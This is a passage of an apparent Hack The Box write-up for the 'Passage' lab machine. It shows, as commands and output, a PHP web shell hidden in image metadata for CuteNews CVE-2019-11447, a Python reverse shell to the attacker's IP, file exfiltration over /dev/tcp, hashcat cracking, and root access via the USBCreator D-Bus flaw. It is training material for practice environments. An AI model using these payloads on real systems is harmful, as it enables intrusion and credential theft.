</span></span></code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=cutenews-cve-2019-11447>CuteNews CVE-2019-11447<a class=anchor aria-hidden=true href=#cutenews-cve-2019-11447>#</a></h4><p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p><blockquote><p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p></blockquote><p>I can also exploit this manually.</p><p>I still have the payload that I made using <code>exiftool</code> in my previous <a href=https://fahmifj.github.io/writeup/htb-magic>Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ exiftool -Comment<span class=o>=</span><span class=s1>&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</span></span></code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;> Personal Options).</p><p><div class=img-container><img src=imgs/image-20210508022032162.png alt=image-20210508022032162></div></p><p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p><img src=imgs/image-20210508023129512.png alt=image-20210508023129512 style=zoom:67%><p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span class=o>=</span>python3 -c <span class=s1>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><p>I have an interactive shell now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ rlwrap nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9001</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.31<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.206<span class=o>]</span> <span class=m>37062</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1678<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@passage:/var/www/html/CuteNews/uploads$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>www-data@passage:/var/www/html/CuteNews/uploads$
</span></span><span class=line><span class=cl>www-data@passage:/var/www/html/CuteNews/uploads$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm-256color
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-paul>Shell as paul<a class=anchor aria-hidden=true href=#shell-as-paul>#</a></h3><h4 id=internal-enumeration>Internal Enumeration<a class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>There are two users in home directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
</span></span><span class=line><span class=cl>ls -l /home
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>17</span> nadav nadav  <span class=m>4096</span> Mar <span class=m>5</span> 09:21 nadav
</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>17</span> paul  paul   <span class=m>4096</span> Mar <span class=m>5</span> 08:32 paul
</span></span></code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p><p><div class=img-container><img src=imgs/image-20210508025611714.png alt=image-20210508025611714></div></p><blockquote><p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p></blockquote><p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</span></span></code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span> &gt; cdata.users
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.31<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.206<span class=o>]</span> <span class=m>55022</span>
</span></span></code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ cat cdata.users<span class=p>|</span> sed <span class=s1>&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>cat cdata.users<span class=p>|</span> sed <span class=s1>&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>a:1:<span class=o>{</span>s:5:<span class=s2>&#34;email&#34;</span><span class=p>;</span>a:1:<span class=o>{</span>s:16:<span class=s2>&#34;paul@passage.htb&#34;</span><span class=p>;</span>s:10:<span class=s2>&#34;paul-coles&#34;</span><span class=p>;</span><span class=o>}}</span>a:1:<span class=o>{</span>s:2:<span class=s2>&#34;id&#34;</span><span class=p>;</span>a:1:<span class=o>{</span>i:1598829833<span class=p>;</span>s:6:<span class=s2>&#34;egre55&#34;</span><span class=p>;</span><span class=o>}}</span>a:1:<span class=o>{</span>s:5:<span class=s2>&#34;email&#34;</span><span class=p>;</span>a:1:<span class=o>{</span>s:15:<span class=s2>&#34;ahaha@gmail.com&#34;</span><span class=p>;</span>s:8:<span class=s2>&#34;ivanpogi&#34;</span><span class=p>;</span><span class=o>}}</span>a:2:<span class=o>{</span>s:5:<span class=s2>&#34;email&#34;</span><span class=p>;</span>a:1:<span class=o>{</span>s:15:<span class=s2>&#34;egre55@test.com&#34;</span><span class=p>;</span>s:6:<span class=s2>&#34;egre55&#34;</span><span class=p>;</span><span class=o>}</span>s:4:<span class=s2>&#34;name&#34;</span><span class=p>;</span>a:1:<span class=o>{</span>s:4:<span class=s2>&#34;debo&#34;</span><span class=p>;</span>a:11:<span class=o>{</span>s:2:<span class=s2>&#34;id&#34;</span><span class=p>;</span>s:10:<span class=s2>&#34;1599412470&#34;</span><span class=p>;</span>s:4:<span class=s2>&#34;name&#34;</span><span class=p>;</span>s:4:<span class=s2>&#34;debo&#34;</span><span class=p>;</span>s:3:<span class=s2>&#34;acl&#34;</span><span class=p>;</span>s:1:<span class=s2>&#34;4&#34;</span><span class=p>;</span>s:5:<span class=s2>&#34;email&#34;</span><span class=p>;</span>s:13:<span class=s2>&#34;debo@debo.com&#34;</span><span class=p>;</span>s:4:<span class=s2>&#34;nick&#34;</span><span class=p>;</span>s:4:<span class=s2>&#34;debo&#34;</span><span class=p>;</span>s:4:<span class=s2>&#34;pass&#34;</span><span class=p>;</span>s:64:<span class=s2>&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span><span class=p>;</span>s:4:<span class=s2>&#34;more&#34;</span><span class=p>;</span>s:60:<span class=s2>&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class=p>;</span>s:6:<span class=s2>&#34;avatar&#34;</span><span class=p>;</span>s:20:<span class=s2>&#34;avatar_debo_bash.php&#34;</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>And that was a mess.</p><p>Among these outputs, there is one that interesting.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>...[SNIP]...&#34;pass&#34;;s:64:&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;...[SNIP]...
</span></span></code></pre></div><p><code>hash-identifier</code> identifies it as SHA-256.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «passage» «192.168.43.234»
</span></span><span class=line><span class=cl>$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
</span></span><span class=line><span class=cl>   <span class=c1>#########################################################################</span>
</span></span><span class=line><span class=cl>   <span class=c1>#     __  __                     __           ______    _____           #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#                                                             By Zion3R #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#                                                    www.Blackploit.com #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#                                                   Root@Blackploit.com #</span>
</span></span><span class=line><span class=cl>   <span class=c1>#########################################################################</span>
</span></span><span class=line><span class=cl>--------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Possible Hashs:
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> SHA-256
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Haval-256
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p><p><div class=img-container><img src=imgs/image-20210508032901929.png alt=image-20210508032901929></div></p><p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «passage» «192.168.43.234»
</span></span><span class=line><span class=cl>$ cat cdata.users<span class=p>|</span> sed <span class=s1>&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class=p>|</span> base64 -d <span class=p>|</span> grep -o -E -e <span class=s2>&#34;[0-9a-f]{64}&#34;</span>
</span></span><span class=line><span class=cl>b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
</span></span><span class=line><span class=cl>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
</span></span><span class=line><span class=cl>5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
</span></span><span class=line><span class=cl>231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
</span></span><span class=line><span class=cl>41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
</span></span><span class=line><span class=cl>4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
</span></span><span class=line><span class=cl>03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
</span></span><span class=line><span class=cl>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
</span></span><span class=line><span class=cl>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
</span></span><span class=line><span class=cl>84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
</span></span><span class=line><span class=cl>4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
</span></span><span class=line><span class=cl>e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
</span></span><span class=line><span class=cl>59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</span></span></code></pre></div><h4 id=cracking-the-hashes>Cracking the Hashes<a class=anchor aria-hidden=true href=#cracking-the-hashes>#</a></h4><p><code>hashcat</code> recovered five passwords.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./hashcat.exe -m <span class=m>1400</span> hashes/passage.hashes ../rockyou.txt -O --show
</span></span><span class=line><span class=cl>b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
</span></span><span class=line><span class=cl>5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
</span></span><span class=line><span class=cl>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
</span></span><span class=line><span class=cl>e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
</span></span><span class=line><span class=cl>59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</span></span></code></pre></div><h4 id=su---paul>SU - paul<a class=anchor aria-hidden=true href=#su---paul>#</a></h4><p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@passage:/home$ su paul 
</span></span><span class=line><span class=cl>su paul
</span></span><span class=line><span class=cl>Password: atlanta1
</span></span><span class=line><span class=cl>paul@passage:~$ 
</span></span></code></pre></div><h3 id=shell-as-nadav>Shell as nadav<a class=anchor aria-hidden=true href=#shell-as-nadav>#</a></h3><h4 id=shared-ssh-keys>Shared SSH keys<a class=anchor aria-hidden=true href=#shared-ssh-keys>#</a></h4><p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>paul@passage:~/.ssh$ cat id_rsa.pub <span class=o>&amp;&amp;</span> cat authorized_keys
</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</span></span></code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>paul@passage:~/.ssh$ ssh nadav@passage.htb
</span></span><span class=line><span class=cl>Last login: Sun Sep  <span class=m>6</span> 11:12:03 <span class=m>2020</span> from 127.0.0.1
</span></span><span class=line><span class=cl>nadav@passage:~$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>nadav<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>nadav<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>nadav<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,113<span class=o>(</span>lpadmin<span class=o>)</span>,128<span class=o>(</span>sambashare<span class=o>)</span>
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=internal-enumeration-1>Internal enumeration<a class=anchor aria-hidden=true href=#internal-enumeration-1>#</a></h4><p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p><p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file (not sure if it&rsquo;s from the box or other players).</p><p><div class=img-container><img src=imgs/c0375013a91f483582b37eebffa521d4.png alt=c0375013a91f483582b37eebffa521d4></div></p><p>The file contains the following information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl># Command Line History (newest to oldest):
</span></span><span class=line><span class=cl>:wq
</span></span><span class=line><span class=cl>:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl># File marks:
</span></span><span class=line><span class=cl>&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class=line><span class=cl>&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Jumplist (newest first):
</span></span><span class=line><span class=cl>-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class=line><span class=cl>-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class=line><span class=cl>-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl>-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl>-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl>-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># History of marks within files (newest to oldest):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class=line><span class=cl>        &#34;       12      7
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl>        &#34;       2       0
</span></span><span class=line><span class=cl>        .       2       0
</span></span><span class=line><span class=cl>        +       2       0
</span></span></code></pre></div><p>The history of files points to these two configuration files:</p><ul><li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li><li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li></ul><p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href=https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html>Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class=line><span class=cl><span class=o>[</span>Configuration<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>AdminIdentities</span><span class=o>=</span>unix-group:sudo<span class=p>;</span>unix-group:admin
</span></span></code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE busconfig PUBLIC
</span></span></span><span class=line><span class=cl><span class=cp> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span></span></span><span class=line><span class=cl><span class=cp> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;busconfig&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Only root can own the service --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;policy</span> <span class=na>user=</span><span class=s>&#34;root&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>own=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/policy&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Allow anyone to invoke methods (further constrained by
</span></span></span><span class=line><span class=cl><span class=c>       PolicyKit privileges --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;policy</span> <span class=na>context=</span><span class=s>&#34;default&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>send_destination=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class=line><span class=cl>           <span class=na>send_interface=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>send_destination=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class=line><span class=cl>           <span class=na>send_interface=</span><span class=s>&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;allow</span> <span class=na>send_destination=</span><span class=s>&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class=line><span class=cl>           <span class=na>send_interface=</span><span class=s>&#34;org.freedesktop.DBus.Properties&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/policy&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/busconfig&gt;</span>
</span></span></code></pre></div><p>From here, it looks only <code>nadav</code> that can invoke the methods of this service</p><h4 id=usbcreator-d-bus-interface-vulnerability>USBCreator D-Bus Interface Vulnerability<a class=anchor aria-hidden=true href=#usbcreator-d-bus-interface-vulnerability>#</a></h4><p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>. The research summary as follows:</p><p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href=https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337>patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p><p>The bug was first reported in 2016<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>, and the affected Ubuntu version is 16.04.</p><p><div class=img-container><img src=imgs/image-20210508150754640.png alt=image-20210508150754640></div></p><p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nadav@passage:~$ uname -a
</span></span><span class=line><span class=cl>Linux passage 4.15.0-45-generic <span class=c1>#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div><h4 id=overwrite-authorized_keys>Overwrite authorized_keys<a class=anchor aria-hidden=true href=#overwrite-authorized_keys>#</a></h4><p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p><p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p><p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll invoke the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=o>()</span>
</span></span></code></pre></div><p>I tried to login as root using my private key, and it worked.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ ssh -i root_rsa root@10.10.10.206
</span></span><span class=line><span class=cl>Last login: Fri Mar  <span class=m>5</span> 17:33:39 <span class=m>2020</span> from 10.10.14.7
</span></span><span class=line><span class=cl>root@passage:~# ls -l
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Jul <span class=m>21</span>  <span class=m>2020</span> exploits
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> root root   <span class=m>33</span> Mar  <span class=m>5</span> 17:05 root.txt
</span></span><span class=line><span class=cl>root@passage:~# 
